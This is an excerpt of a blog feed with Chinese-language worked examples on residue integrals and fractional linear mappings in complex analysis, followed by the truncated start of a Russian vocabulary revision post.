mode=display">\oint_{\Gamma_R}f(z)dz = \int_{-R}^{R}f(x)dx + \int_{C_R}f(z)dz.</script><p>令 $R\rightarrow +\infty$, 由于</p><script type="math/tex; mode=display">\lim_{R\rightarrow +\infty}\int_{C_R}f(z)dz = 0,</script><p>那么 <script type="math/tex">\begin{aligned}            I_n &= \frac{1}{2}\lim_{R\rightarrow +\infty}\oint_{\Gamma_R}f(z)dz \\            &= \pi i\sum_{k = 1}^{n}Res\left[\frac{1}{1 + z^{2n}}, z_k\right] = \pi i\sum_{k = 1}^{n}\frac{1}{2nz_k^{2n - 1}} \\            &= \frac{\pi i}{2n}\sum_{k = 1}^{n}z_k^{2n - 1} = -\frac{\pi i}{2n}\sum_{k = 1}^{n}z_k \\            &= -\frac{\pi i}{2n}\sum_{k = 1}^{n}e^{\frac{(2k - 1)\pi i}{2n}} = -\frac{\pi i}{2n}e^{-\frac{\pi i}{2n}}\sum_{k = 1}^{n}e^{\frac{k\pi i}{n}} \\            &= -\frac{\pi i}{2n}e^{-\frac{\pi i}{2n}}\frac{2}{1 - e^{\frac{\pi i}{n}}} = \frac{\pi i}{n}\frac{1}{e^{\frac{\pi i}{2n}} - e^{-\frac{\pi i}{2n}}} \\            &= \frac{\pi i}{n}\frac{1}{2i\sin\frac{\pi}{2n}} = \frac{\frac{\pi}{2n}}{\sin\frac{\pi}{2n}}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求复积分</p><script type="math/tex; mode=display">I_{r, n} = \int_{0}^{+\infty}\cfrac{dx}{r^{2n} + x^{2n}}.</script><p>其中 $r &gt; 0$. ◻</p><p>$\textbf{Solution:}$</p><script type="math/tex; mode=display">\begin{aligned}            I_{r, n} &= \cfrac{1}{r^{2n - 1}}\int_{0}^{+\infty}\cfrac{d\left(\frac{x}{r}\right)}{1 + \left(\frac{x}{r}\right)^{2n}} \\            &= \cfrac{1}{r^{2n - 1}}I_n \\            &= \frac{\frac{\pi}{2n}}{r^{2n - 1}\sin\frac{\pi}{2n}}.        \end{aligned}$$ ◻$\textbf{Example:}$求积分 $$J_n = \int_{0}^{+\infty}\cfrac{dx}{1 + x^n},</script><p>其中 $n \ge 2$. ◻</p><p>$\textbf{Solution:}$<br>注意到</p><script type="math/tex; mode=display">J_n = \lim_{R\rightarrow +\infty}\int_{0}^{R}\cfrac{dx}{1 + x^n}.</script><p>作<br>$\Gamma_R: \left[0, R\right]\cup C_R\cup \left[Re^{i\theta}, 0\right]$,</p><p>那么根据复合闭路定理, 得</p><script type="math/tex; mode=display">\oint_{\Gamma_R}f(z)dz = \int_{0}^{R}f(x)dx + \int_{C_R}f(z)dz + \int_{R}^{0}f(xe^{i\theta})d(xe^{i\theta}).</script><p>令 $R\rightarrow +\infty$, 由于</p><script type="math/tex; mode=display">\lim_{R\rightarrow +\infty}\int_{C_R}f(z)dz = 0,</script><p>取 $\theta = \cfrac{2\pi}{n}, \varphi = \cfrac{\pi}{n}$, 那么</p><script type="math/tex; mode=display">\begin{aligned}            \lim_{R\rightarrow +\infty}\oint_{\Gamma_R}f(z)dz &= \lim_{R\rightarrow +\infty}\int_{0}^{R}f(x)dx + \lim_{R\rightarrow +\infty}\int_{R}^{0}f(xe^{i\theta})d(xe^{i\theta}) \\            &= \lim_{R\rightarrow +\infty}\left(\int_{0}^{R}\cfrac{dx}{1 + x^n}dx - \int_{0}^{R}\cfrac{e^{i\theta}dx}{1 + e^{ni\theta}x^n}\right) \\            &= \lim_{R\rightarrow +\infty}\left(\int_{0}^{R}\cfrac{dx}{1 + x^n}dx - e^{\frac{2\pi i}{n}}\int_{0}^{R}\cfrac{dx}{1 + x^n}\right) \\            &= \left(1 - e^{\frac{2\pi i}{n}}\right)\lim_{R\rightarrow +\infty}\int_{0}^{R}\cfrac{dx}{1 + x^n}dx \\            &= \left(1 - e^{\frac{2\pi i}{n}}\right)J_n.        \end{aligned}</script><p>又注意到 <script type="math/tex">\begin{aligned}            \lim_{R\rightarrow +\infty}\oint_{\Gamma_R}f(z)dz = 2\pi i\frac{1}{ne^{(n - 1)\frac{\pi i}{n}}},        \end{aligned}</script></p><p>故 <script type="math/tex">\begin{aligned}            J_n &= \frac{2\pi i}{ne^{(n - 1)\frac{\pi i}{n}}\left(1 - e^{\frac{2\pi i}{n}}\right)} \\            &= \frac{2\pi i}{ne^{(\pi - \varphi)i}\left(1 - e^{2\varphi i}\right)} \\            &= \frac{\pi i}{n(-\cos\varphi + i\sin\varphi)\sin\varphi(\sin\varphi - i\cos\varphi)} \\            &= \frac{\pi}{n\sin\varphi} = \frac{\frac{\pi}{n}}{\sin\frac{\pi}{n}}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$</p><script type="math/tex; mode=display">\frac{1}{(1 + z)^n} = \sum_{k = 0}^{+\infty}(-1)^k C_{n + k - 1}^{n - 1}z^k,</script><p>其中 $\left|{z}\right| &lt; 1$. 特别地, 其中 $z^{n - 1}$ 项的系数为</p><script type="math/tex; mode=display">(-1)^{n - 1}C_{2n - 2}^{n - 1} = (-1)^{n - 1}\cfrac{(2n - 2)!}{(n - 1)!(n - 1)!}.$$ ◻$\textbf{Example:}$求积分 $$J_n = \int_{0}^{+\infty}\cfrac{dx}{(1 + x^2)^n}.$$ ◻$\textbf{Solution:}$注意到$$J_n = \frac{1}{2}\lim_{R\rightarrow +\infty}\int_{-R}^{R}\cfrac{dx}{(1 + x^2)^n}.</script><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$,</p><p>那么根据复合闭路定理, 得</p><script type="math/tex; mode=display">\oint_{\Gamma_R}f(z)dz = \int_{-R}^{R}f(x)dx + \int_{C_R}f(z)dz.</script><p>令 $R\rightarrow +\infty$, 由于</p><script type="math/tex; mode=display">\lim_{R\rightarrow +\infty}\int_{C_R}f(z)dz = 0,</script><p>因为 <script type="math/tex">\begin{aligned}            \cfrac{1}{(1 + z^2)^n} &= \cfrac{1}{(z + i)^n(z - i)^n} \\            &= \cfrac{1}{(2i)^n(1 + \frac{z - i}{2i})^n(z - i)^n} \\            &= \cfrac{1}{(2i)^n(z - i)^n}\sum_{k = 0}^{+\infty}(-1)^k C_{n + k - 1}^{n - 1}(\frac{z - i}{2i})^k.        \end{aligned}</script></p><p>其中 $\cfrac{1}{z - i}$ 的系数<br>$c_{-1} = \cfrac{(-1)^{n - 1}C_{2n - 2}^{n - 1}}{(2i)^{2n - 1}} = \cfrac{-iC_{2n - 2}^{n - 1}}{2^{2n - 1}}$.</p><p>那么 <script type="math/tex">\begin{aligned}            J_n &= \pi i Res[f, i] \\            &= \pi ic_{-1} \\            &= \cfrac{\pi C_{2n - 2}^{n - 1}}{2^{2n - 1}}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求复积分 <script type="math/tex">J_{r, n} = \int_{0}^{+\infty}\cfrac{dx}{(r^2 + x^2)^n}.</script></p><p>其中 $r &gt; 0$. ◻</p><p>$\textbf{Solution:}$</p><script type="math/tex; mode=display">\begin{aligned}            J_{r, n} &= \cfrac{1}{r^{2n - 1}}\int_{0}^{+\infty}\cfrac{d\left(\frac{x}{r}\right)}{\left(1 + \left(\frac{x}{r}\right)^{2}\right)^n} \\            &= \cfrac{1}{r^{2n - 1}}J_n \\            &= \cfrac{\pi C_{2n - 2}^{n - 1}}{(2r)^{2n - 1}}.        \end{aligned}$$ ◻### 14. 留数 C$\textbf{Example:}$$C_R: Re^{i\theta}$, $0\le\theta\le\pi$, 多项式 $P$, $Q$ 满足$\deg Q\ge\deg P + 1$, 则$$\lim_{R\rightarrow +\infty}\limits\int_{C_R}\frac{P(z)e^{ikz}}{Q(z)}dz = 0.$$ ◻$\textbf{Example:}$求积分 $$I = \int_{0}^{+\infty}\cfrac{x\sin kx}{x^2 + a^2}dx,</script><p>其中 $a &gt; 0$, $k &gt; 0$ 为常数. ◻</p><p>$\textbf{Solution:}$<br>记 $f(z) = \cfrac{z\sin kz}{z^2 + a^2}$,<br>$h(z) = \cfrac{ze^{ikx}}{z^2 + a^2}$.</p><p>那么</p><script type="math/tex; mode=display">\int_{-\infty}^{+\infty}\limits h(z)dz = \int_{-\infty}^{+\infty}\limits\cfrac{z\cos kz}{z^2 + a^2}dz + i\int_{-\infty}^{+\infty}\limits f(z)dz = 2iI.</script><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$, 那么根据复合闭路定理, 得</p><script type="math/tex; mode=display">\oint_{\Gamma_R}h(z)dz = \int_{-R}^{R}h(x)dx + \int_{C_R}h(z)dz.</script><p>令 $R\rightarrow +\infty$, 由于</p><script type="math/tex; mode=display">\lim_{R\rightarrow +\infty}\int_{C_R}h(z)dz = 0,</script><p>那么 <script type="math/tex">\begin{aligned}            \int_{-\infty}^{+\infty}\cfrac{ze^{ikz}}{z^2 + a^2}dz &= \lim_{R\rightarrow +\infty}\oint_{\Gamma_R}h(z)dz \\            &= 2\pi i Res\left[f(z), ai\right] \\            &= 2\pi i\cdot\cfrac{e^{-ka}}{2} \\            &= \cfrac{\pi i}{e^{ka}}.        \end{aligned}</script></p><p>两边取虚部, 得 <script type="math/tex">\begin{aligned}            I = \cfrac{\pi}{2e^{ka}}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求积分</p><script type="math/tex; mode=display">I_n = \int_{0}^{+\infty}\cfrac{x\sin kx}{(x^2 + a^2)^n}dx,</script><p>其中 $a &gt; 0$, $k &gt; 0$ 为常数. ◻</p><p>$\textbf{Solution:}$<br>注意到</p><script type="math/tex; mode=display">\frac{\partial I_n}{\partial a} = -2na\int_{0}^{+\infty}\cfrac{x\sin kx}{(x^2 + a^2)^{n + 1}}dx = -2naI_{n + 1}.</script><p>即 <script type="math/tex">I_{n + 1} = -\cfrac{1}{2na}\frac{\partial I_n}{\partial a}.</script></p><p>依次递归求解即可. ◻</p><p>$\textbf{Example:}$<br>求积分</p><script type="math/tex; mode=display">I_{a, b, k} = \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)(x^2 + b^2)}dx,</script><p>其中 $a&gt;0$, $b &gt; 0$, $k &gt; 0$ 为常数. ◻</p><p>$\textbf{Solution:}$<br>记 $f(z) = \cfrac{z^3\sin kz}{(z^2 + a^2)(z^2 + b^2)}$,<br>$h(z) = \cfrac{z^3e^{ikx}}{(z^2 + a^2)(z^2 + b^2)}$.</p><p>那么</p><script type="math/tex; mode=display">\int_{-\infty}^{+\infty}\limits h(z)dz = \int_{-\infty}^{+\infty}\limits\cfrac{z^3\cos kz}{(z^2 + a^2)(z^2 + b^2)}dz + i\int_{-\infty}^{+\infty}\limits f(z)dz = 2iI_{a, b, k}.</script><p>作 $\Gamma_R: \left[-R, R\right]\cup C_R$, 那么根据复合闭路定理, 得</p><script type="math/tex; mode=display">\oint_{\Gamma_R}h(z)dz = \int_{-R}^{R}h(x)dx + \int_{C_R}h(z)dz.</script><p>令 $R\rightarrow +\infty$, 由于</p><script type="math/tex; mode=display">\lim_{R\rightarrow +\infty}\int_{C_R}h(z)dz = 0,</script><p>那么 <script type="math/tex">\begin{aligned}            \int_{-\infty}^{+\infty}\cfrac{z^3e^{ikz}}{(z^2 + a^2)(z^2 + b^2)}dz &= \lim_{R\rightarrow +\infty}\oint_{\Gamma_R}h(z)dz \\            &= 2\pi i\left(Res\left[f(z), ai\right] + Res\left[f(z), bi\right]\right) \\            &= \pi i\cdot\cfrac{b^2e^{-kb} - a^2e^{-ka}}{b^2 - a^2}.        \end{aligned}</script></p><p>两边取虚部, 得 <script type="math/tex">\begin{aligned}            \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)(x^2 + b^2)}dx = \cfrac{\pi}{2}\cdot\cfrac{b^2e^{-kb} - a^2e^{-ka}}{b^2 - a^2}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求积分</p><script type="math/tex; mode=display">I_{a, k} = \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)^2}dx,</script><p>其中 $a &gt; 0$, $k &gt; 0$ 为常数. ◻</p><p>$\textbf{Solution:}$<br>在 <script type="math/tex">\begin{aligned}            \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)(x^2 + b^2)}dx = \cfrac{\pi}{2}\cdot\cfrac{b^2e^{-kb} - a^2e^{-ka}}{b^2 - a^2}.        \end{aligned}</script></p><p>中, 令 $b\rightarrow a$, 得 <script type="math/tex">\begin{aligned}            \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)^2}dx = \cfrac{\pi}{2}\cdot\cfrac{(2 - ka)e^{-ka}}{2}.        \end{aligned}</script> ◻</p><p>$\textbf{Example:}$<br>求复积分 <script type="math/tex">I_k = \int_{0}^{+\infty}\cfrac{\sin kx}{x}dx.</script></p><p>其中 $k &gt; 0$. ◻</p><p>$\textbf{Solution:}$<br>在 <script type="math/tex">\begin{aligned}            \int_{0}^{+\infty}\cfrac{x^3\sin kx}{(x^2 + a^2)^2}dx = \cfrac{\pi}{2}\cdot\cfrac{(2 - ka)e^{-ka}}{2}.        \end{aligned}</script></p><p>中, 令 $a\rightarrow 0^{+}$, 得 <script type="math/tex">\begin{aligned}            \int_{0}^{+\infty}\cfrac{\sin kx}{x}dx = \cfrac{\pi}{2}.        \end{aligned}</script> ◻</p><h3 id="15-解析映射"><a href="#15-解析映射" class="headerlink" title="15. 解析映射"></a>15. 解析映射</h3><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 将 $z_k = -1, 0, 1$ 映射到 $w_k = -1, 1, i$. ◻</p><p>$\textbf{Solution:}$<br>利用不变式</p><script type="math/tex; mode=display">\cfrac{w - w_1}{w - w_2}\bigg/\cfrac{w_3 - w_1}{w_3 - w_2} = \cfrac{z - z_1}{z - z_2}\bigg/\cfrac{z_3 - z_1}{z_3 - z_2}.</script><p>那么</p><script type="math/tex; mode=display">\cfrac{w + 1}{w - 1}\bigg/\cfrac{i + 1}{i - 1} = \cfrac{z + 1}{z}\bigg/\cfrac{2}{1}.</script><p>从中解得 <script type="math/tex">w = \cfrac{(1 + 2i)z + 1}{(1 - 2i)z + 1}.</script> ◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 将单位圆周映射到直线. ◻</p><p>$\textbf{Solution:}$<br>一方面, 容易知道存在 $\left|{z_0}\right| = 1$, 使得<br>$cz_0 + d = 0$.</p><p>注意到 <script type="math/tex">\begin{aligned}            &\hspace{1.8em} cz_0 + d = 0 \\            &\Rightarrow \left|{cz_0}\right| = \left|{d}\right| \\            &\Leftrightarrow \left|{c}\right| = \left|{d}\right| \\            &\Leftrightarrow c = de^{i\theta}.        \end{aligned}</script></p><p>另一方面, 当 $c = de^{i\theta}$ 时, 该分式线性映射满足条件. ◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将单位圆盘 $\left|{z}\right| &lt; 1$ 映射到单位圆盘<br>$\left|{w}\right| &lt; 1$;</li><li>将点 $z = z_1\thinspace(\left|{z_1}\right| &lt; 1)$ 映射到点 $w = 0$. ◻</li></ul><p>$\textbf{Solution:}$<br>由于分式线性映射保对称点的性质,</p><p>映射前 $z_1$ 的对称点为 $\cfrac{1}{\overline{z_1}}$, 映射后为 $0$<br>的对称点 $+\infty$. 故</p><script type="math/tex; mode=display">w = \alpha\cfrac{z - z_1}{z - \frac{1}{\overline{z_1}}} = (-\alpha z_1)\cfrac{z - z_1}{1 - z\overline{z_1}} = \beta\cfrac{z - z_1}{1 - z\overline{z_1}}.</script><p>由最大模原理:</p><script type="math/tex; mode=display">\left|{z}\right| = 1\Leftrightarrow\left|{w}\right| = 1.</script><p>注意到 $\left|{z_1}\right| &lt; 1$, 从而有 <script type="math/tex">\begin{aligned}            1 &= \left|{\beta}\right|\left|{\cfrac{z - z_1}{1 - z\overline{z_1}}}\right|_{\left|{z}\right| = 1} \\            &= \left|{\beta}\right|\left|{\cfrac{z - z_1}{z\overline{z} - z\overline{z_1}}}\right|_{\left|{z}\right| = 1} \\            &= \cfrac{\left|{\beta}\right|}{\left|{z}\right|}\left|{\cfrac{z - z_1}{\overline{z  - z_1}}}\right|_{\left|{z}\right| = 1} \\            &= \left|{\beta}\right|.        \end{aligned}</script></p><p>即 <script type="math/tex">\beta = e^{i\theta}, \theta\in[0, 2\pi).</script></p><p>那么有</p><script type="math/tex; mode=display">w = e^{i\theta}\cfrac{z - z_1}{1 - z\overline{z_1}}, \thinspace\left|{z_1}\right| < 1, \thinspace\theta\in[0, 2\pi).$$ ◻$\textbf{Example:}$求分式线性映射 $w(z)$ 满足:- 将单位圆盘 $\left|{z - z_0}\right| < r$ 映射到单位圆盘  $\left|{w - w_0}\right| < R$;- 将点 $z = z_1\thinspace(\left|{z_1 - z_0}\right| < r)$ 映射到点  $w = w_0$. ◻$\textbf{Solution:}$考虑 $$z' = \cfrac{z - z_0}{r}, w' = \cfrac{w - w_0}{R}.</script><p>则 $z’(z)$, $w’(w)$ 均将原区域映射为单位圆盘. 那么有</p><script type="math/tex; mode=display">w' = e^{i\theta}\cfrac{z' - z_1'}{1 - z'\overline{z_1'}}, \thinspace\left|{z_1'}\right| < 1, \thinspace\theta\in[0, 2\pi).</script><p>代入 $w’$, $z’$ 可得</p><script type="math/tex; mode=display">w = w_0 + rRe^{i\theta}\cfrac{z - z_1}{r^2 - (z - z_0)(\overline{z_1} - \overline{z_0})}, \thinspace\left|{z_1 - z_0}\right| < r, \thinspace\theta\in[0, 2\pi).$$ ◻$\textbf{Example:}$对于 中的映射, 证明不变式:$$\cfrac{\left|{dw}\right|}{1 - \left|{w}\right|^2} = \cfrac{\left|{dz}\right|}{1 - \left|{z}\right|^2}.$$ ◻$\textbf{Solution:}$即证:$$\left|{\cfrac{dw}{dz}}\right| = \cfrac{1 - \left|{w}\right|^2}{1 - \left|{z}\right|^2}.</script><p>注意到 <script type="math/tex">w = e^{i\theta}\cfrac{z - z_1}{1 - z\overline{z_1}},</script></p><p>其中 <script type="math/tex">\left|{z_1}\right| < 1, \thinspace\theta\in[0, 2\pi)</script></p><p>那么 <script type="math/tex">\begin{aligned}            LHS = \left|{e^{i\theta}\cfrac{1 - z_1\overline{z_1}}{(1 - z\overline{z_1})^2}}\right| = \cfrac{1 - z_1\overline{z_1}}{\left|{1 - z\overline{z_1}}\right|^2}.        \end{aligned}</script></p><script type="math/tex; mode=display">\begin{aligned}            RHS &= \cfrac{1 - w\overline{w}}{1 - z\overline{z}} \\            &= \cfrac{\left|{1 - z\overline{z_1}}\right|^2 - \left|{z - z_1}\right|^2}{(1 - z\overline{z})\left|{1 - z\overline{z_1}}\right|^2} \\            &= \cfrac{(1 - z\overline{z_1})(1 - z_1\overline{z}) - (z - z_1)(\overline{z} - \overline{z_1})}{(1 - z\overline{z})\left|{1 - z\overline{z_1}}\right|^2} \\            &= \cfrac{1 - z\overline{z} - z_1\overline{z_1} + z\overline{z}z_1\overline{z_1}}{(1 - z\overline{z})\left|{1 - z\overline{z_1}}\right|^2} \\            &= \cfrac{(1 - z\overline{z})(1 - z_1\overline{z_1})}{(1 - z\overline{z})\left|{1 - z\overline{z_1}}\right|^2} \\            &= \cfrac{1 - z_1\overline{z_1}}{\left|{1 - z\overline{z_1}}\right|^2} = LHS.        \end{aligned}</script><p>至此证毕.  ◻</p><p>$\textbf{Example:}$<br>对于 中的映射, 证明不变式:</p><script type="math/tex; mode=display">\cfrac{R\left|{dw}\right|}{R^2 - \left|{w - w_0}\right|^2} = \cfrac{r\left|{dz}\right|}{r^2 - \left|{z - z^0}\right|^2}.$$ ◻$\textbf{Solution:}$考虑 $$z' = \cfrac{z - z_0}{r}, w' = \cfrac{w - w_0}{R}.</script><p>则 $z’(z)$, $w’(w)$ 均将原区域映射为单位圆盘. 那么有</p><script type="math/tex; mode=display">\cfrac{\left|{dw’}\right|}{1 - \left|{w'}\right|^2} = \cfrac{\left|{dz'}\right|}{1 - \left|{z'}\right|^2}.</script><p>代入 $w’$, $z’$ 可得</p><script type="math/tex; mode=display">\cfrac{R\left|{dw}\right|}{R^2 - \left|{w - w_0}\right|^2} = \cfrac{r\left|{dz}\right|}{r^2 - \left|{z - z^0}\right|^2}.$$ ◻$\textbf{Example:}$求分式线性映射 $w(z)$ 满足:- 将上半复平面 $Im{z} > 0$ 映射到单位圆盘 $\left|{w}\right| < 1$;- 将点 $z = z_1\thinspace(Im{z_1} > 0)$ 映射到点 $w = 0$. ◻ $\textbf{Solution:}$将上半平面看作半径无穷的圆, $z_1$ 关于圆周的对称点为$\overline{z_1}$.由于分式线性映射保对称点的性质,映射前 $z_1$ 的对称点为 $\overline{z_1}$, 映射后为 $0$ 的对称点$+\infty$. 故 $$w = \alpha\cfrac{z - z_1}{z - \overline{z_1}}.</script><p>由最大模原理: <script type="math/tex">z = x\in\mathbb{R}\Leftrightarrow\left|{w}\right| = 1.</script></p><p>注意到 $Im{z_1} &gt; 0$, 从而有 <script type="math/tex">\begin{aligned}            1 &= \left|{\alpha}\right|\left|{\cfrac{x - z_1}{x - \overline{z_1}}}\right| \\            &= \left|{\alpha}\right|\left|{\cfrac{x - z_1}{\overline{x} - \overline{z_1}}}\right| \\            &= \left|{\alpha}\right|.        \end{aligned}</script></p><p>即 <script type="math/tex">\alpha = e^{i\theta}, \theta\in[0, 2\pi).</script></p><p>那么有</p><script type="math/tex; mode=display">w = e^{i\theta}\cfrac{z - z_1}{z - \overline{z_1}}, \thinspace Im{z_1} > 0, \thinspace\theta\in[0, 2\pi).</script><p>特别地, 取 $\theta = 0, z_1 = i$, 可得 <script type="math/tex">w = \cfrac{z - i}{z + i}.</script> ◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将过点 $x_0\in\mathbb{R}$, 旋转角为 $\theta_0$<br>的半平面映射到单位圆盘 $\left|{w - w_0}\right| &lt; R$;</li><li>将点 $z = z_1\thinspace(Im{[(z_1 - x_0)e^{-i\theta_0}]} &gt; 0)$<br>映射到点 $w = w_0$. ◻</li></ul><p>$\textbf{Solution:}$<br>考虑</p><script type="math/tex; mode=display">z' = (z - x_0)e^{-i\theta_0}, w' = \cfrac{w - w_0}{R}.</script><p>则 $z’(z)$, $w’(w)$ 均将原区域映射为上半复平面与单位圆盘. 那么有</p><script type="math/tex; mode=display">w' = e^{i\theta}\cfrac{z' - z_1'}{z' - \overline{z_1'}}, \thinspace Im{z_1'} > 0, \thinspace\theta\in[0, 2\pi).</script><p>代入 $w’$, $z’$ 可得</p><script type="math/tex; mode=display">w = w_0 + Re^{i\theta}\cfrac{z - z_1}{z - x_0 - (\overline{z_1} - x_0)e^{2i\theta_0}},</script><p>其中</p><script type="math/tex; mode=display">Im{[(z_1 - x_0)e^{-i\theta_0}]} > 0, \thinspace\theta\in[0, 2\pi).$$ ◻$\textbf{Example:}$映射 $w = \cfrac{az + b}{cz + d}$, 若 $a, b, c, d\in\mathbb{R}$, 则$$Im{z} > 0\leftrightarrow Im{w} > 0 \Longleftrightarrow ad - bc > 0.$$ ◻$\textbf{Solution:}$将 $z = x + iy$ 待入 $$w = \cfrac{az + b}{cz + d},</script><p>得 <script type="math/tex">w = u + iv = \cfrac{(ax + b) + iay}{(cx + d) + icy},</script></p><p>那么 <script type="math/tex">v = \cfrac{(ad - bc)y}{(cx + d)^2 + (cy)^2}.</script></p><p>从而 <script type="math/tex">\begin{aligned}            &\hspace{2em} Im{z} > 0\leftrightarrow Im{w} > 0 \\            &\Longleftrightarrow y > 0\leftrightarrow v > 0 \\            &\Longleftrightarrow yv > 0 \\            &\Longleftrightarrow \cfrac{(ad - bc)y^2}{(cx + d)^2 + (cy)^2} > 0 \\            &\Longleftrightarrow ad - bc > 0.        \end{aligned}</script></p><p>根据最大模原理可知,</p><p>该映射将上半复平面映到上半复平面, 实轴映到实轴.</p><p>又当 $z\in\mathbb{R}$ 时,</p><script type="math/tex; mode=display">\cfrac{dw}{dz} = \cfrac{ad - bc}{(cz + d)^2} > 0.</script><p>即 <script type="math/tex">\arg\left(\frac{dw}{dz}\right) = 0.</script></p><p>故该映射将上半复平面映到上半复平面, 实轴正向映到实轴正向. ◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将过点 $a, b\in\mathbb{R}$, 旋转角为 $\alpha\in(0, \pi)$<br>的长条映射到单位圆盘 $\left|{w}\right| &lt; 1$. ◻</li></ul><p>$\textbf{Solution:}$<br>分为四步</p><ol><li>$z_1 = e^{-i\alpha}(z - b)$</li><li>$z_2 = \cfrac{\pi}{h}z_1$</li><li>$z_3 = e^{z_2}$</li><li>$w = \cfrac{z_3 - i}{z_3 + i}$</li></ol><p>整理得</p><script type="math/tex; mode=display">w = \cfrac{e^{\frac{e^{-i\alpha}(z - b)\pi}{(b - a)\sin\alpha}} - i}{e^{\frac{e^{-i\alpha}(z - b)\pi}{(b - a)\sin\alpha}} + i}.</script><p>特别地, 当 $\alpha = \cfrac{\pi}{2}$ 时,</p><script type="math/tex; mode=display">w = \cfrac{e^{\frac{b - z}{b - a}\pi i} - i}{e^{\frac{b - z}{b - a}\pi i} + i}.$$ ◻$\textbf{Example:}$求分式线性映射 $w(z)$ 满足:/- 将区域  $0 < r < R, \thinspace 0 < \theta < \alpha \thinspace(\alpha\in[0, 2\pi))$  映射到单位圆盘 $\left|{w}\right| < 1$. ◻ $\textbf{Solution:}$分为四步1. $z_1 = z^{\frac{\pi}{\alpha}}$2. $z_2 = \cfrac{R^{\frac{\pi}{\alpha}} + z_1}{R^{\frac{\pi}{\alpha}} - z_1}$   (上半圆 $\longrightarrow$ 第一象限)3. $z_3 = z_2^2$4. $w = \cfrac{z_3 - i}{z_3 + i}$整理得$$w = \cfrac{\left(\frac{R^{\frac{\pi}{\alpha}} + z^{\frac{\pi}{\alpha}}}{R^{\frac{\pi}{\alpha}} - z^{\frac{\pi}{\alpha}}}\right)^2 - i}{\left(\frac{R^{\frac{\pi}{\alpha}} + z^{\frac{\pi}{\alpha}}}{R^{\frac{\pi}{\alpha}} - z^{\frac{\pi}{\alpha}}}\right)^2 + i}.</script><p>特别地, 当 $\alpha = \cfrac{\pi}{8}$ 时,</p><p><script type="math/tex">w = \cfrac{\left(\frac{R^8 + z^8}{R^8 - z^8}\right)^2 - i}{\left(\frac{R^8 + z^8}{R^8 - z^8}\right)^2 + i}.</script> ◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li>将<br>$\left|{z - a}\right| &gt; a, \left|{z - b}\right| &lt; b\thinspace(0 &lt; a &lt; b)$<br>所围区域映到单位圆盘 $\left|{w}\right| &lt; 1$. ◻</li></ul><p>$\textbf{Solution:}$<br>分为五步</p><ol><li>$z_1 = \cfrac{z - 2a}{z}$ ($0 &lt; x &lt; \cfrac{b - a}{a}$ 的竖直长条)</li><li>$z_2 = iz_1$</li><li>$z_3 = \cfrac{\pi}{\frac{b - a}{a}}z_2$</li><li>$z_4 = e^{z_3}$</li><li>$w = \cfrac{z_4 - i}{z_4 + i}$</li></ol><p>整理得</p><p><script type="math/tex">w = \cfrac{e^{\frac{ib(z - 2a)\pi}{(b - a)z}} - i}{e^{\frac{ib(z - 2a)\pi}{(b - a)z}} + i}.</script> ◻</p><p>$\textbf{Example:}$<br>求分式线性映射 $w(z)$ 满足:</p><ul><li><p>将以 $A, B$ 为端点, $\theta_0\in(0, 2\pi)$<br>为弦切角的弓形映到单位圆盘 $\left|{w}\right| &lt; 1$. ◻</p><p>$\textbf{Solution:}$<br>分为三步</p></li></ul><ol><li>$z_1 = \cfrac{z - A}{B - z}$ (弓形 $\longrightarrow$ 第一象限角域)</li><li>$z_2 = z_1^{\frac{\pi}{\theta_0}}$</li><li>$w = \cfrac{z_2 - i}{z_2 + i}$</li></ol><p>整理得</p><p><script type="math/tex">w = \cfrac{\left(\frac{z - A}{B - z}\right)^{\frac{\pi}{\theta_0}} - i}{\left(\frac{z - A}{B - z}\right)^{\frac{\pi}{\theta_0}} + i}.</script> ◻</p>]]></content>
      
      
      <categories>
          
          <category> Maths </category>
          
          <category> Algebra </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maths </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Russian End-of-term Revision</title>
      <link href="/2022/12/28/e-yu-qi-mo-fu-xi/"/>
      <url>/2022/12/28/e-yu-qi-mo-fu-xi/</url>
      
        <content type="html"><![CDATA[<h4 id="及物动词"><a href="#及物动词" class="headerlink" title="及物动词"></a>及物动词</h4><ul><li>(第四课) есть; </li><li>(第五课) делать, читать, считать, искать, знать, слушать; </li><li>(第六课) смотреть, писать, учить;</li><li>(第七课) любить, изучать;</li><li>(第九课) рассказывать, видеть, ждать, петь, вспоминать;</li><li>(第十课) звать;</li><li>(常用) покупать.</li></ul><ol><li><p>делать (做):</p><p>делать урок; делать упражнения (练习);</p></li><li><p>читать (读):</p><p>читать книгу (书); читать текст; читать диалог; читать стихи (诗歌); </p></li><li><p>считать (数):</p><p>считать бананы; </p></li><li><p>искать (寻找):</p><p>искать часы (时间); искать плащ; искать счастье (幸福); </p></li><li><p>знать (了解, 认识):</p><p>знать это; знать тебя; знать русский язык; </p></li><li><p>слушать (听):</p><p>слушать музыку; слушать текст; слушать диалог; слушать стихи;</p></li><li><p>смотреть (看):</p><p>смотреть телевизор (电视); смотреть фильм; </p></li><li><p>писать (写):</p><p>писать письмо; писать новые слова; писать диалог; писать стихи;</p></li><li><p>любить (热爱):</p><p>любить весну и зиму; любить русский язык; Я тебя люблю (我爱你);</p></li><li><p>изучать (研究): </p><p>изучать русский язык; изучать математику; изучать стихи; изучать Пушкина;</p></li><li><p>видеть (看见):</p><p>Вчера мы видели тебя в библиотеке.</p></li><li><p>ждать 